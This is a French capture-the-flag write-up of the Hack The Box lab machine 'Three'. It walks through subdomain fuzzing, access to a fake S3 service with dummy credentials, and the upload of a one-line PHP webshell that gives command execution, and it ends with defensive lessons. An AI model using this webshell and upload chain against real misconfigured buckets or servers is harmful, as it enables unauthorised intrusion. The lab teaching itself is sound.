# Three — HTB Starting Point (Tier 1)

| | |
|---|---|
| **Section** | Starting Point — Tier 1 |
| **Machine** | `Three` |
| **OS** | Linux |
| **IP cible** | `10.129.160.40` *(change à chaque spawn)* |
| **Difficulté** | Very Easy |
| **Date** | 2026-11-02 |
| **Résultat** | flag ✅ |

---

## TL;DR — chaîne d'attaque (cloud AWS S3 → webshell → RCE)

```
nmap  →  80 HTTP (site "The Toppers")
      →  e-mail sur le site -> domaine thetoppers.htb  -> /etc/hosts
      →  sous-domaine s3.thetoppers.htb (faux AWS S3 / localstack)
      →  aws configure (creds bidons) ; aws s3 ls -> bucket thetoppers.htb
      →  le bucket EST la racine web  ->  upload d'un webshell PHP
      →  curl shell.php?cmd=...  ->  RCE (www-data)  ->  flag
```

---

## 1. Reconnaissance

```bash
box three <IP>
nmap -Pn -sV -sC -oN nmap/initial $IP
```

Port **80** : site statique « The Toppers ». Dans la page (section contact) se trouve une **adresse e-mail** qui révèle le domaine : `...@thetoppers.htb`.

```bash
echo "$IP thetoppers.htb s3.thetoppers.htb" >> /etc/hosts
```

> Énumération de vhosts (si le domaine n'est pas évident) :
> ```bash
> ffuf -u http://$IP -H "Host: FUZZ.thetoppers.htb" \
>   -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 11952
> ```
> ⚠️ Le mot-clé **`FUZZ`** est sensible à la casse (pas `Fuzz`). `-fs 11952` filtre la page par défaut (toujours 11952 octets) pour ne garder que les vrais sous-domaines. Ici le sous-domaine est **`s3`**.

---

## 2. Le service S3 (AWS en local)

La cible fait tourner un **faux AWS** (localstack) sur `s3.thetoppers.htb`. On le pilote avec l'**AWS CLI** (`aws`) en pointant sur son endpoint. Les credentials ne sont pas vérifiés → on met n'importe quoi :

```bash
aws configure
#   AWS Access Key ID : test
#   AWS Secret Access Key : test
#   Default region : us-east-1
#   output : (vide)

aws --endpoint-url=http://s3.thetoppers.htb s3 ls
#   -> thetoppers.htb                       (le bucket)

aws --endpoint-url=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
#   PRE images/
#   .htaccess
#   index.php            <-- le bucket contient les fichiers DU SITE
```

→ `index.php` dans le bucket = **le bucket est la racine web** servie sur le port 80.

---

## 3. Upload d'un webshell → RCE

Puisque les fichiers du bucket sont servis par le site, on **uploade un webshell PHP** et on l'exécute via le navigateur :

```bash
echo '<?php system($_GET["cmd"]); ?>' > exploits/shell.php
aws --endpoint-url=http://s3.thetoppers.htb s3 cp exploits/shell.php s3://thetoppers.htb/shell.php

curl "http://thetoppers.htb/shell.php?cmd=id"
#   uid=33(www-data) gid=33(www-data) groups=33(www-data)   <-- RCE !
```

**Localiser et lire le flag** (via `-G --data-urlencode` pour gérer les espaces proprement) :

```bash
curl -G "http://thetoppers.htb/shell.php" --data-urlencode "cmd=find / -name flag.txt 2>/dev/null"
curl -G "http://thetoppers.htb/shell.php" --data-urlencode "cmd=cat /var/www/flag.txt"
```

---

## 4. Leçons à retenir

- **Énumération de vhosts/sous-domaines** : une appli peut cacher des services sur des sous-domaines (`s3.`). Un e-mail/mention sur le site donne souvent le domaine ; `ffuf -H "Host: FUZZ..."` découvre le reste.
- **`-fs` en vhost fuzzing** : filtrer la taille de la réponse par défaut pour isoler les vrais hôtes.
- **S3 mal configuré = write = RCE** : un bucket **accessible en écriture** et servi comme racine web permet d'uploader du code exécutable. Mauvaise config cloud ultra-classique.
- **`aws --endpoint-url=...`** : pointer l'AWS CLI sur un S3 custom (localstack, MinIO...). `aws configure` avec des creds bidons suffit quand le service ne les valide pas.
- **Webshell `system($_GET['cmd'])`** : exécution de commandes via un paramètre d'URL. Utiliser `curl -G --data-urlencode` pour les commandes avec espaces/caractères spéciaux.
- **Défense** : buckets en lecture seule, séparés du contenu exécutable, et credentials/droits S3 stricts.

---

## Commandes — récap express

```bash
box three <IP>
nmap -Pn -sV -sC -oN nmap/initial $IP
echo "$IP thetoppers.htb s3.thetoppers.htb" >> /etc/hosts
aws configure                                               # creds bidons
aws --endpoint-url=http://s3.thetoppers.htb s3 ls           # -> thetoppers.htb
echo '<?php system($_GET["cmd"]); ?>' > exploits/shell.php
aws --endpoint-url=http://s3.thetoppers.htb s3 cp exploits/shell.php s3://thetoppers.htb/shell.php
curl "http://thetoppers.htb/shell.php?cmd=id"               # RCE www-data
curl -G "http://thetoppers.htb/shell.php" --data-urlencode "cmd=cat /var/www/flag.txt"
```
